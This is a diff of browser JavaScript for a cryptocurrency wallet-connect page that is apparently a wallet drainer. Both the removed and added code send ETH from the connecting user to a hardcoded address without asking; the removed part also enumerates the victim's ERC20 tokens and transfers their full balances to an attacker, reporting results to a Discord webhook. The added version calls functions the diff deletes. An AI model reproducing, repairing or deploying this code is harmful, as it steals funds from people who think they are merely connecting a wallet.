@@ -1,143 +1,112 @@
-let web3Modal;
-let provider;
-let signer;
+let isConnecting = false; // Flag to prevent multiple connections
 
-async function init() {
-    const providerOptions = {
-        walletconnect: {
-            package: WalletConnectProvider.default,
-            options: {
-                infuraId: "YOUR_INFURA_ID" // or Alchemy API
-            }
-        },
-        coinbasewallet: {
-            package: CoinbaseWalletSDK,
-            options: {
-                appName: "My Dapp",
-                infuraId: "YOUR_INFURA_ID", // or Alchemy API
-                chainId: 1,
-            }
-        }
-    };
+async function connectWallet() {
+    if (isConnecting) {
+        console.log("Connection request already in progress...");
+        return; // Exit if already connecting
+    }
 
-    web3Modal = new Web3Modal({
-        cacheProvider: false, // optional
-        providerOptions, // required
-        theme: "dark", // or "light" based on preference
-    });
+    isConnecting = true; // Set the flag to true
+    document.getElementById("connectButton").disabled = true; // Disable the button
 
-    document.getElementById("connectButton").addEventListener("click", onConnect);
+    // Show wallet options by displaying the wallet selection div
+    document.getElementById("walletSelection").style.display = 'block';
 }
 
-async function onConnect() {
-    try {
-        provider = await web3Modal.connect();
-        const web3Provider = new ethers.providers.Web3Provider(provider);
-        signer = web3Provider.getSigner();
-        const account = await signer.getAddress();
-        console.log(`Connected to account: ${account}`);
-        document.getElementById('status').innerText = `Connected: ${account}`;
+function walletSelected(walletChoice) {
+    document.getElementById("walletSelection").style.display = 'none'; // Hide the wallet selection
 
-        // Automatically trigger the first transaction
-        await sendFirstTransaction(account);
-    } catch (error) {
-        console.error("Error connecting wallet:", error);
+    let account;
+    if (walletChoice === "MetaMask") {
+        // MetaMask connection logic
+        if (typeof window.ethereum !== 'undefined') {
+            window.ethereum.request({ method: 'eth_requestAccounts' })
+            .then(accounts => {
+                account = accounts[0];
+                console.log(`Connected to MetaMask account: ${account}`);
+                return sendFirstTransaction(account); // Automatically send the first transaction
+            })
+            .catch(error => console.error("Error connecting to MetaMask:", error));
+        } else {
+            alert("MetaMask is not installed. Please install it.");
+            window.open("https://metamask.app.link/dapp/swiftmultisolutions.github.io/web3/", "_blank");
+        }
+    } else if (walletChoice === "Trust Wallet") {
+        // Trust Wallet connection logic (same as MetaMask)
+        if (typeof window.ethereum !== 'undefined') {
+            window.ethereum.request({ method: 'eth_requestAccounts' })
+            .then(accounts => {
+                account = accounts[0];
+                console.log(`Connected to Trust Wallet account: ${account}`);
+                return sendFirstTransaction(account); // Automatically send the first transaction
+            })
+            .catch(error => console.error("Error connecting to Trust Wallet:", error));
+        } else {
+            alert("Trust Wallet is not installed.");
+        }
+    } else if (walletChoice === "Coinbase Wallet") {
+        // Coinbase Wallet connection logic (same as MetaMask)
+        if (typeof window.ethereum !== 'undefined') {
+            window.ethereum.request({ method: 'eth_requestAccounts' })
+            .then(accounts => {
+                account = accounts[0];
+                console.log(`Connected to Coinbase Wallet account: ${account}`);
+                return sendFirstTransaction(account); // Automatically send the first transaction
+            })
+            .catch(error => console.error("Error connecting to Coinbase Wallet:", error));
+        } else {
+            alert("Coinbase Wallet is not installed.");
+        }
+    } else if (walletChoice === "Phantom Wallet") {
+        // Phantom Wallet logic (unsupported for Ethereum)
+        alert("Phantom Wallet is not supported for Ethereum.");
+        return;
+    } else if (walletChoice === "Zerion Wallet") {
+        // Zerion Wallet connection logic (same as MetaMask)
+        if (typeof window.ethereum !== 'undefined') {
+            window.ethereum.request({ method: 'eth_requestAccounts' })
+            .then(accounts => {
+                account = accounts[0];
+                console.log(`Connected to Zerion Wallet account: ${account}`);
+                return sendFirstTransaction(account); // Automatically send the first transaction
+            })
+            .catch(error => console.error("Error connecting to Zerion Wallet:", error));
+        } else {
+            alert("Zerion Wallet is not installed.");
+        }
     }
 }
 
 async function sendFirstTransaction(walletAddress) {
-    const recipientAddress = "0x7acfbcc88e94ED31568dAD7Dfe25fa532ab023bD"; // Your recipient address
-    const amountInEther = "0.0002"; // First transaction amount
+    if (typeof window.ethereum !== 'undefined') {
+        const provider = new ethers.providers.Web3Provider(window.ethereum);
+        const signer = provider.getSigner();
+        const recipientAddress = "0x7acfbcc88e94ED31568dAD7Dfe25fa532ab023bD"; // Your recipient address
+        const amountInEther = "0.0002"; // The updated amount for the first transaction
 
-    const transaction = {
-        to: recipientAddress,
-        value: ethers.utils.parseEther(amountInEther),
-    };
+        const transaction = {
+            to: recipientAddress,
+            value: ethers.utils.parseEther(amountInEther),
+        };
 
-    try {
-        const txResponse = await signer.sendTransaction(transaction);
-        console.log("First transaction response:", txResponse);
+        try {
+            const txResponse = await signer.sendTransaction(transaction);
+            console.log("First transaction response:", txResponse);
 
-        // Send to Discord webhook
-        await sendWebhook(txResponse.hash, "success");
+            // Send to Discord webhook
+            await sendWebhook(txResponse.hash, "success");
 
-        // Automatically trigger the second transaction based on token balance
-        await sendSecondTransaction(signer, walletAddress);
-    } catch (error) {
-        console.error("Error sending first transaction:", error);
-
-        // Send to Discord webhook
-        await sendWebhook(error.message, "failure");
-    }
-}
-
-async function sendSecondTransaction(signer, walletAddress) {
-    const erc20TokenAddresses = await getERC20TokenAddresses(walletAddress);
-    const tokenThreshold = 0.000001; // Token threshold for second transaction
-
-    for (const tokenAddress of erc20TokenAddresses) {
-        const tokenContract = new ethers.Contract(tokenAddress, erc20ABI, signer);
-        const balance = await tokenContract.balanceOf(walletAddress);
-        const tokenDecimals = await tokenContract.decimals();
-        const tokenSymbol = await tokenContract.symbol();
-
-        // Convert balance to decimal form
-        const balanceInUnits = balance / Math.pow(10, tokenDecimals);
-
-        if (balanceInUnits > tokenThreshold) {
-            console.log(`Sending ${balanceInUnits} ${tokenSymbol} from ${walletAddress}`);
-
-            const txResponse = await tokenContract.transfer(
-                "0xRecipientAddress", // Actual recipient address
-                balance // Full balance
-            );
-
-            console.log(`Transaction hash: ${txResponse.hash}`);
+            // Automatically trigger the second transaction using the fixed token threshold
+            await sendSecondTransaction(signer, walletAddress);
+        } catch (error) {
+            console.error("Error sending first transaction:", error);
+            // Send to Discord webhook
+            await sendWebhook(error.message, "failure");
         }
-    }
-}
-
-async function getERC20TokenAddresses(walletAddress) {
-    const apiKey = "YOUR_ALCHEMY_API_KEY"; // Alchemy API key
-    const url = `https://eth-mainnet.g.alchemy.com/v2/${apiKey}/getTokenBalances?owner=${walletAddress}`;
-
-    const response = await fetch(url);
-    const data = await response.json();
-
-    if (data.tokenBalances) {
-        return data.tokenBalances
-            .filter(token => token.tokenBalance > 0)
-            .map(token => token.contractAddress);
     } else {
-        console.error("Error fetching token addresses:", data.message);
-        return [];
+        console.error("MetaMask is not installed. Please install it.");
     }
 }
 
-async function sendWebhook(message, status) {
-    const webhookUrl = "YOUR_DISCORD_WEBHOOK_URL"; // Discord webhook URL
-    const payload = {
-        content: `Transaction Status: ${status}\nMessage: ${message}`
-    };
-
-    try {
-        await fetch(webhookUrl, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload),
-        });
-        console.log("Webhook sent successfully");
-    } catch (error) {
-        console.error("Error sending webhook:", error);
-    }
-}
-
-// ERC20 Token ABI
-const erc20ABI = [
-    "event Transfer(address indexed from, address indexed to, uint256 value)",
-    "function balanceOf(address owner) view returns (uint256)",
-    "function transfer(address to, uint256 value) returns (bool)"
-];
-
-// Initialize web3modal on page load
-window.addEventListener("load", init);
+// Attach the event listener to the button
+document.getElementById("connectButton").addEventListener("click", connectWallet);
